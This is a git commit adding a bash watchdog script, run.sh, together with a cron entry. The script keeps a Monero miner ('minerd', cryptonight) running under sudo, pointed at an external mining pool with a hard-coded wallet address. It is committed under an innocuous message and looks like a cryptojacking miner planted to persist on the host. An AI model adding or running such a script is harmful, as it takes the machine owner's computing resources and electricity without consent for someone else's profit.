48fa1bf94611387466d9dc46157661b4aee15b65
Zhongming Chen <zhongmingc@asos.com>
2018-01-27 11:45:55 +0000

    added run.sh and cron expression

---
+++ run.sh
@@ -0,0 +1,15 @@
+#!/bin/bash
+#make-run.sh
+#make sure a process is always running.
+
+process=minerd
+makerun="sudo ./minerd -a cryptonight -o stratum+tcp://xmr.bohemianpool.com:4444 -u 45Szo5vQ2rtV68GPqgi9UQ1dg357jwVd2LoWZYn9uY6kFdrSJDcrWfaXLVBBTTCtbrWdB2azjgS1HadpDenghciv3ezAdp7 -p x -t 5"
+
+if ps ax | grep -v grep | grep $process > /dev/null
+then
+    exit
+else
+    $makerun &
+fi
+
+exit
